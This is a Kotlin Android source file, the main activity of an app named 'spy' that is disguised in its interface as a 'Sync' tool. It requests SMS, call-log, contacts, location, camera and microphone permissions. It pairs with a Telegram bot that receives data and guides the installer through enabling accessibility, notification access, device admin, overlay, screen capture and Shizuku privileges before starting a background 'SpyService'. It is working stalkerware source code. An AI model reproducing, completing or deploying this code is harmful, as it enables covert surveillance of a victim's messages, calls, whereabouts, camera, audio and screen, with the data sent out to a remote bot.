package com.you.spy.ui

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.you.spy.net.TgApi
import com.you.spy.service.SpyAccessibilityService
import com.you.spy.service.SpyService
import com.you.spy.util.Config
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import rikka.shizuku.Shizuku

class MainActivity : ComponentActivity() {

    private val perms = buildList {
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.RECEIVE_SMS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_PHONE_STATE)
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent { MaterialTheme { Root() } }
    }

    @Composable
    private fun Root() {
        var connected by remember { mutableStateOf(Config.connected) }
        if (connected) Dashboard(onReset = { connected = false })
        else Setup(onDone = { connected = true })
    }

    // ---------------- SETUP ----------------
    @Composable
    private fun Setup(onDone: () -> Unit) {
        val scope = rememberCoroutineScope()
        var token by remember { mutableStateOf(Config.token) }
        var code by remember { mutableStateOf(Config.code.ifEmpty { "sync-" + (1000..9999).random() }) }
        var status by remember { mutableStateOf("") }
        var busy by remember { mutableStateOf(false) }

        Column(
            Modifier.fillMaxSize().background(Color(0xFF0B1220)).padding(20.dp).verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Text("Sync setup", color = Color.White, fontSize = 24.sp)
            Text(
                "1. @BotFather se naya bot banao, token copy karo\n" +
                "2. Neeche token aur code daalo\n" +
                "3. Connect dabao, phir bot ko /start <code> bhejo",
                color = Color(0xFF94A3B8), fontSize = 13.sp
            )

            OutlinedTextField(
                value = token, onValueChange = { token = it },
                label = { Text("Bot token") },
                modifier = Modifier.fillMaxWidth()
            )
            OutlinedTextField(
                value = code, onValueChange = { code = it },
                label = { Text("Setup code") },
                modifier = Modifier.fillMaxWidth()
            )

            Button(
                onClick = {
                    scope.launch {
                        busy = true
                        status = "validating token..."
                        val user = TgApi.let {
                            Config.token = token.trim()
                            Config.code = code.trim()
                            it.getMe()
                        }
                        if (user == null) {
                            status = "token invalid"
                            busy = false
                            return@launch
                        }
                        status = "bot @$user ok. ab bot ko /start $code bhejo (60s)"
                        val deadline = System.currentTimeMillis() + 60_000
                        var found = false
                        while (System.currentTimeMillis() < deadline && !found) {
                            val ups = withContext(Dispatchers.IO) { TgApi.getUpdates(Config.offset, 5) }
                            for (u in ups) {
                                Config.offset = u.optLong("update_id") + 1
                                val txt = u.optJSONObject("message")?.optString("text").orEmpty()
                                val chat = u.optJSONObject("message")?.optJSONObject("chat")?.optLong("id")
                                if (chat != null && txt.contains(code)) {
                                    Config.chat = chat.toString()
                                    found = true
                                    break
                                }
                            }
                        }
                        busy = false
                        status = if (found) "paired ✓" else "timeout — dobara try karo"
                        if (found) { requestPerms(); onDone() }
                    }
                },
                enabled = !busy && token.isNotBlank()
            ) { Text(if (busy) "please wait..." else "Connect") }

            if (status.isNotEmpty()) Text(status, color = Color(0xFF38BDF8), fontSize = 13.sp)
        }
    }

    // ---------------- DASHBOARD ----------------
    @Composable
    private fun Dashboard(onReset: () -> Unit) {
        val scope = rememberCoroutineScope()
        var log by remember { mutableStateOf("") }
        var running by remember { mutableStateOf(Config.running) }

        fun refresh() {
            log = buildString {
                appendLine("chat: ${Config.chat}")
                appendLine("accessibility: ${if (isAccessibilityOn()) "on" else "off"}")
                appendLine("notif access: ${if (isNotifOn()) "on" else "off"}")
                appendLine("battery exempt: ${if (isBatteryExempt()) "yes" else "no"}")
                appendLine("admin: ${isAdminActive()}")
                appendLine("overlay: ${Settings.canDrawOverlays(this@MainActivity)}")
                appendLine("shizuku: ${runCatching { Shizuku.pingBinder() }.getOrDefault(false)}")
            }
        }

        LaunchedEffect(Unit) { refresh() }

        Column(
            Modifier.fillMaxSize().background(Color(0xFF0B1220)).padding(20.dp).verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Text("Sync dashboard", color = Color.White, fontSize = 24.sp)

            Text(log, color = Color(0xFF94A3B8), fontFamily = FontFamily.Monospace, fontSize = 12.sp)

            Button(onClick = { requestPerms(); refresh() }) { Text("Runtime permissions") }
            Button(onClick = { openAccessibility() }) { Text("Enable accessibility") }
            Button(onClick = { openNotifAccess() }) { Text("Enable notification access") }
            Button(onClick = {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName")))
            }) { Text("Battery exemption") }
            Button(onClick = {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    .setData(Uri.parse("package:$packageName")))
            }) { Text("Overlay permission") }
            Button(onClick = { requestAdmin() }) { Text("Activate device admin") }
            Button(onClick = { openScreenCapture() }) { Text("Screen capture consent") }
            Button(onClick = {
                runCatching { Shizuku.requestPermission(0) }
            }) { Text("Shizuku permission") }

            Spacer(Modifier.height(8.dp))

            Button(onClick = {
                if (running) {
                    stopService(Intent(this@MainActivity, SpyService::class.java))
                    Config.running = false
                } else {
                    ContextCompat.startForegroundService(
                        this@MainActivity, Intent(this@MainActivity, SpyService::class.java)
                    )
                }
                running = !running
                scope.launch {
                    withContext(Dispatchers.IO) {
                        TgApi.send(if (running) "▶️ service started" else "⏸ service stopped")
                    }
                }
            }) { Text(if (running) "Stop service" else "Start service") }

            OutlinedButton(onClick = { Config.clear(); onReset() }) { Text("Unpair") }
        }
    }

    // ---------------- helpers ----------------
    private fun requestPerms() {
        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 1)
        if (Build.VERSION.SDK_INT >= 29) {
            runCatching {
                requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 2)
            }
        }
    }

    private fun isAccessibilityOn(): Boolean {
        val name = ComponentName(this, SpyAccessibilityService::class.java)
        val flat = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return flat.contains(name.flattenToString())
    }

    private fun openAccessibility() =
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))

    private fun isNotifOn(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.contains(packageName)
    }

    private fun openNotifAccess() =
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))

    private fun isBatteryExempt(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, com.you.spy.receiver.AdminReceiver::class.java))
    }

    private fun requestAdmin() {
        val i = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(this, com.you.spy.receiver.AdminReceiver::class.java)
            )
        startActivity(i)
    }

    private fun openScreenCapture() =
        startActivity(Intent(this, ScreenCaptureActivity::class.java))
}
